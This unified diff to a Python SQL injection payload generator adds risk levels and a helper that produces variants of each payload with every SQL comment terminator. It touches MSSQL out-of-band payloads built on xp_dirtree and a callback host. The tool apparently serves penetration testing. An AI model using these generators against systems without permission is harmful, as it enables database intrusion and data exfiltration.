@@ -1,5 +1,29 @@
 from dataclasses import dataclass
 
+_TERMINATORS = ("-- -", "--", "/*", "#")
+
+
+def _strip_terminator(payload: str) -> str:
+    stripped = payload.rstrip()
+    for terminator in _TERMINATORS:
+        if stripped.endswith(terminator):
+            return stripped[: -len(terminator)].rstrip()
+    return stripped
+
+
+def _terminator_variants(payloads: list[str]) -> list[str]:
+    """risk=3 helper: for each variant that ends with a known SQL comment
+    terminator, add copies using every other known terminator. Profile-agnostic
+    so no per-DBMS payload text needs to be hand-written for risk=3."""
+    variants = list(payloads)
+    for payload in payloads:
+        base = _strip_terminator(payload)
+        if base == payload:
+            continue
+        for terminator in _TERMINATORS:
+            variants.append(f"{base}{terminator}")
+    return list(dict.fromkeys(variants))
+
 
 @dataclass(frozen=True)
 class Profile:
@@ -123,7 +147,7 @@ class Profile:
 
         return None
 
-    def direct_payloads(self, base: str, expression: str, prefix: str, domain: str) -> list[str]:
+    def _direct_payloads_full(self, base: str, expression: str, prefix: str, domain: str) -> list[str]:
         payload = self.direct_payload(base, expression, prefix, domain)
         if payload is None:
             return []
@@ -172,6 +196,16 @@ class Profile:
 
         return [payload]
 
+    def direct_payloads(self, base: str, expression: str, prefix: str, domain: str, risk: int = 2) -> list[str]:
+        full = self._direct_payloads_full(base, expression, prefix, domain)
+        if not full:
+            return []
+        if risk <= 1:
+            return full[:1]
+        if risk >= 3:
+            return _terminator_variants(full)
+        return full
+
     def payload(self, base: str, condition: str, callback_host: str) -> str:
         if self.name == "mssql":
             return (
@@ -219,7 +253,7 @@ class Profile:
             )
         raise ValueError(f"unknown profile: {self.name}")
 
-    def payloads(self, base: str, condition: str, callback_host: str) -> list[str]:
+    def _payloads_full(self, base: str, condition: str, callback_host: str) -> list[str]:
         if self.name == "mssql":
             variants = []
             for proc in ("xp_dirtree", "xp_fileexist", "xp_subdirs"):
@@ -282,6 +316,14 @@ class Profile:
             ]))
 
         return [self.payload(base, condition, callback_host)]
+
+    def payloads(self, base: str, condition: str, callback_host: str, risk: int = 2) -> list[str]:
+        full = self._payloads_full(base, condition, callback_host)
+        if risk <= 1:
+            return [self.payload(base, condition, callback_host)]
+        if risk >= 3:
+            return _terminator_variants(full)
+        return full
 
 
 PROFILES = {
